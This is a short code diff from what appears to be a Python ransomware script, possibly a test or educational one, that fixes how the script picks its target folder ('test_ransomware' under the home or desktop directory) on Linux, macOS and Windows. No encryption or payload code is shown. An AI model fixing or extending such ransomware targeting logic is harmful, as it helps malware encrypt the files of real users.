@@ -50,7 +50,7 @@ def main():
     else:
         # Check OS
         plt = platform.system()
-        if plt == ("Linux" or "Darwin"):
+        if plt == "Linux" or plt == "Darwin":
             startdirs = [os.environ['HOME'] + '/test_ransomware']
         elif plt == "Windows":
             startdirs = [os.environ['USERPROFILE'] + '\\desktop\\test_ransomware']
